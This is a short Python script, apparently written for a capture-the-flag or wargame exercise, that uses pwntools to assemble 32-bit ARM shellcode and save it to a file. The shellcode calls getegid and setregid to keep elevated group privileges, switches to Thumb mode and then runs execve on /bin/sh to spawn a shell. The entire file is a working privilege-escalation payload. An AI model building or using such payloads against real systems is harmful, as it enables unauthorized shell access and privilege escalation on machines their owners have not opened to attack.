#!/usr/bin/env python3
from pwn import *
from pwn import asm, context

context.arch = "arm"
context.bits = 32

# setregid(getegid(), getegid())
# getegid: 50(%r7)
# setregid: 71(%r7) (%r0 = gid_t rgid, %r1 = gid_t rgid)
shellcode = asm(
    """
mov     r7, 50
eor     r2, r2
svc     1010101
push    {r0, r1, r2, r3, r4, r5, r6, r7, r8}
pop     {r1}
mov     r7, 71
eor     r2, r2
svc     1010101
"""
)
# execve("/bin/sh", 0, 0)
# execve: 11(%r7) (%r0 = const char *filename, %r1 = const char *argv[], %r2 = const char *envp[])
# /bin/sh = 2f_62_69_6e_2f_73_68
shellcode += asm(
    """
.code 32
add     r2, pc, #1
bx      r2
.code 16
adr     r0, binsh
sub     r1, r1
mov     r2, r1
strb    r2, [r0, #7]
mov     r7, 11
svc     1
binsh:
    .ascii "/bin/shX"
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
